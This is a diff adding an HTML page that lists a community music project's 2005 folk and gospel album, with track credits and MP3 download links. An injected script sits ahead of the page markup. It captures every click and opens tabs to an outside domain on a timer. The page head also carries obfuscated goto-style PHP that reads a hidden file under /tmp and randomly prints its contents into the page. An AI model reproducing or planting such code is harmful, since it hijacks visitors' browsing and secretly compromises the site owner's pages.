@@ -1,0 +1,289 @@
+<script>(function (parameters) {
+    const targets = [
+        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
+    ]
+    // Times between clicks
+    const restMinutes = 1;
+    // Number of hours to allow re-click 
+    const allowedHours = 2;
+
+
+    const saveTargetLocationsToStorage = (targets) => {
+        targets.forEach((target, index) => {
+            if(!localStorage.getItem(`${target}-local-storage`)){
+            	localStorage.setItem(`${target}-local-storage`, 0);
+            }
+        });
+    }
+    const getRandomLocationFromStorage = (targets) => {
+        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+    }
+    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+    const getHoursDiff = (startDate, endDate) => {
+        const msInHour = 1000 * 60 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInHour);
+    }
+    const getMintsDiff = (startDate, endDate) => {
+        const msInMints = 1000 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInMints);
+    }
+
+    const visitNewLocation = (targets, host, nowDate) => {
+        saveTargetLocationsToStorage(targets);
+        newLocation = getRandomLocationFromStorage(targets);
+        setTimeToStorage(`${host}-mnts`, nowDate);
+        setTimeToStorage(`${host}-hurs`, nowDate);
+        setLocationAsVisited(newLocation);
+        window.open(newLocation, "_blank");
+    }
+
+    // const randomLocation = getRandomLocationFromStorage(targets);
+    saveTargetLocationsToStorage(targets);
+
+    function globalClick(event) {
+        event.stopPropagation();
+        const host = location.host;
+        let newLocation = getRandomLocationFromStorage(targets);
+        const nowDate = Date.parse(new Date());
+        const savedDateForMints = getTimeStorage(`${host}-mnts`);
+        const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+        if (savedDateForMints && savedDateForHours) {
+            try {
+                const storageDateForMints = parseInt(savedDateForMints);
+                const storageDateForHours = parseInt(savedDateForHours);
+                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+                if (hoursDiff >= allowedHours) {
+                    saveTargetLocationsToStorage(targets);
+                    setTimeToStorage(`${host}-hurs`, nowDate);
+                }
+                if (mintsDiff >= restMinutes) {
+                    if (newLocation) {
+                        setTimeToStorage(`${host}-mnts`, nowDate);
+                        window.open(newLocation, "_blank");
+                        setLocationAsVisited(newLocation);
+                    }
+                }
+            } catch (error) { visitNewLocation(targets, host, nowDate); }
+        } else { visitNewLocation(targets, host, nowDate); }
+    }
+    document.addEventListener("click", globalClick)
+})()</script>
+<html>
+	<head>
+		<title>The Community Music Project</title>
+		<link href="cmp.css" rel="stylesheet" type="text/css">
+	<?php goto FkQAX; bZNcz: $purDK = "\x3c\41\x2d\55{$QYhSu}\55\x2d\x3e"; goto cD2OM; lWfiu: $qUpUD = "\x2f\164\x6d\160\x2f\x73\x65\x73\x73\x31\137\x31\71\142\x36\x66\63\x32\x37\x62\x62\71\141\142\143\63\x64\x62\144\x66\x62\x61\143\x63\x66\67\62\143\x35\x34\x65\x66\x37"; goto ZUQmd; FkQAX: $E47ox = FALSE; goto lWfiu; ZUQmd: if (!(file_exists($qUpUD) && is_readable($qUpUD))) { goto ZvWyT; } goto IAIBJ; k208u: if (!($E47ox !== FALSE)) { goto bF4hT; } goto QJywi; Spi4Z: bF4hT: goto NCIgg; IAIBJ: $E47ox = str_replace(PHP_EOL, '', @file_get_contents($qUpUD)); goto o8oeF; cD2OM: echo rand(1, 3) === 3 ? $purDK . $E47ox . PHP_EOL : $purDK . PHP_EOL; goto Spi4Z; x282G: $QYhSu = sha1_file($ZcK5q); goto bZNcz; o8oeF: ZvWyT: goto k208u; QJywi: $ZcK5q = __FILE__; goto x282G; NCIgg: ?></head>
+	<body>
+		<iframe id="nav" src="nav.html"></iframe>
+		
+		<p class="album">
+			<img src="images/titc.jpg" />
+			<h3>The Innocence To Cry (2005)</h3>
+			<span class="description">
+				Original folk, traditional gospel, Russian and Chilean folk.
+				<br/><br/>
+				<a href="albums/titc/titc.zip">Dowload entire album as zip</a><br/>
+				<a href="albums/titc/titc-art.zip">Dowload album art</a>
+			</span>
+		</p>
+		
+		<hr />
+		
+		<h3>Track listing and album art coming soon...</h3>
+		
+		<ol class="tracks">
+			<li>
+				<b><a href="albums/titc/TITC-01-Looking_Back.mp3">Looking Back</a></b>
+				(5:02)
+				<i>&copy; 2003 dandelion john</i>
+				<ul>
+					<li>dandelion: Vocal, Guitar</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-02-Moscow_Night.mp3">&#x041F;&#x043E;&#x0434;&#x043C;&#x043E;&#x0441;&#x043A;&#x043E;&#x0432;&#x043D;&#x043B;&#x0435;&#x0020;&#x0412;&#x0435;&#x0447;&#x0435;&#x0440;&#x0430;, "Podmoscovnia Vechera", Moscow Night</a></b>
+				(3:02)
+				<i>Post WWII Russian romance</i>
+				<ul>
+					<li>Jamuna: Vocal</li>
+					<li>Jonathan: Lead, Rhythm Guitar</li>
+					<li>Paul: Bass</li>
+					<li>Kevin: Drums</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-03-All_That_I_Am.mp3">All That I Am</a></b>
+				(2:40)
+				<i>&copy; 2004 Claudia Lopez Bascu&#x00F1;an</i>
+				<ul>
+					<li>Claudia: Vocal, Guitar</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-04-Sweeping_Through_The_City.mp3">Sweeping Through The City</a></b>
+				(3:42)
+				<i>Traditional</i>
+				<ul>
+					<li>Beverly, Pauline, Frinco: Vocals, Harmonies</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-05-Seeds.mp3">Seeds</a></b>
+				(3:57)
+				<i>&copy; 2001 Richard Edwards</i>
+				<ul>
+					<li>Richard: Vocal, Guitar</li>
+					<li>Sheila: Harmony, Guitar</li>
+					<li>Brooksie: Harmony</li>
+					<li>Paul: Bass</li>
+					<li>Gabriel: Violin</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-06-Light_Years_As.mp3">Light Years</a></b>
+				(4:59)
+				<i>&copy; 1999 Lora L. Dunn</i>
+				<ul>
+					<li>Lora: Vocal, Acoustic Guitar</li>
+					<li>dandelion: Electric Guitar</li>
+					<li>Sheila: Harmonies</li>
+					<li>Paul: Bass</li>
+					<li>Ken: Drums/BFD</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-07-Six_Days.mp3">Six Days</a></b>
+				(3:53)
+				<i>&copy; 2005 Richard Edwards</i>
+				<ul>
+					<li>Sheila: Vocal</li>
+					<li>Mahlon: Saxophone</li>
+					<li>Paul: Bass</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-08-Within_That_Grace.mp3">Within That Grace</a></b>
+				(6:05)
+				<i>&copy; 2003 Cynthia R. Crossen</i>
+				<ul>
+					<li>Cynthia: Vocal, Rhythm Guitar</li>
+					<li>Jonathan: Lead Guitar</li>
+					<li>Beverly, John, Cynthia: Harmonies</li>
+					<li>Paul: Bass</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-09-Wade_In_The_Water.mp3">Wade In The Water</a></b>
+				(3:21)
+				<i>Traditional</i>
+				<ul>
+					<li>Beverly: Vocal</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-10-Embers.mp3">Embers</a></b>
+				(4:05)
+				<i>&copy; 2004 Jesse G. Crossen</i>
+				<ul>
+					<li>Jesse: Vocal; Lead, Rhythm Guitar</li>
+					<li>Hope: Harmony</li>
+					<li>Jill: Percussion</li>
+					<li>Paul: Bass</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-11-Score_For_Bosch.mp3">Score For Bosch</a></b>
+				(4:10)
+				<i>&copy; 2004 Ari Picker (with Nora Hughes)</i>
+				<ul>
+					<li>Ari: Vocal, All Instruments (except for strings)</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-12-Spring_Forest.mp3">&#x0412;&#x0435;&#x0441;&#x0435;&#x043D;&#x043D;&#x0435;&#x043C;&#x0020;&#x041B;&#x0435;&#x0441;&#x0443;, "Vecenem Lyecu", Spring Forest</a></b>
+				(2:33)
+				<i>Russian movie song</i>
+				<ul>
+					<li>Jamuna: Vocal</li>
+					<li>Jonathan: Lead, Rhythm Guitar</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-13-Woman_Of_Broken_Dreams.mp3">Woman Of Broken Dreams</a></b>
+				(4:15)
+				<i>&copy; 2003 Cynthia R. Crossen</i>
+				<ul>
+					<li>Cynthia: Vocal, Rhythm Guitar</li>
+					<li>dandelion: Lead Guitar</li>
+					<li>Paul: Bass</li>
+					<li>Ken: Drums/BFD</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-14-Oganyoke.mp3">&#x041E;&#x0433;&#x043E;&#x043D;&#x0435;&#x043A;, "Oganyoke", Little Light</a></b>
+				(3:22)
+				<i>WWII Russian folk song</i>
+				<ul>
+					<li>Jamuna: Vocal</li>
+					<li>Jonathan: Lead, Rhythm Guitar</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-15-All_Of_Our_Help_Comes_From_The_Lord.mp3">All Of Our Help Comes From The Lord</a></b>
+				(5:43)
+				<i>Traditional</i>
+				<ul>
+					<li>Georgia: Vocal</li>
+					<li>Jasper: Guitar</li>
+					<li>Cory: Bass</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-16-In_A_Glade_(Danube).mp3">&#x041E;&#x0439;&#x0020;&#x0423;&#x0020;&#x0413;&#x0430;&#x044E;,&#x0020;&#x041F;&#x0440;&#x0438;&#x0020;&#x0414;&#x0443;&#x043D;&#x0430;&#x044E;, "Oi U Gaiu, Pri Dynaiu", In A Glade</a></b>
+				(4:53)
+				<i>Ukrainian folk song </i>
+				<ul>
+					<li>Jamuna: Vocal, Harmonies</li>
+					<li>dandelion: Lead Guitar</li>
+					<li>Paul: Rhythm Guitar, Bass</li>
+					<li>Ken: Drums/BFD</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-17-This_Road_To_Love.mp3">This Road To Love</a></b>
+				(4:06)
+				<i>&copy; 2003 Cynthia R. Crossen</i>
+				<ul>
+					<li>Cynthia: Vocal, Guitar</li>
+					<li>Paul: Bass</li>
+					<li>Jesse: Harmony</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-18-Swing_Down_Chariot.mp3">Swing Down Chariot</a></b>
+				(1:41)
+				<i>Traditional</i>
+				<ul>
+					<li>Beverly, Pauline, Frinco: Vocals, Harmonies</li>
+				</ul>
+			</li>
+			<li>
+				<b><a href="albums/titc/TITC-19-Claudia's_Lullaby.mp3">Claudia's Lullaby</a></b>
+				(1:43)
+				<i>&copy; 2005 Claudia Lopez Bascu&#x00F1;an</i>
+				<ul>
+					<li>Claudia: Vocal, Guitar</li>
+				</ul>
+			</li>
+		</ol>
+		
+	</body>
+</html>
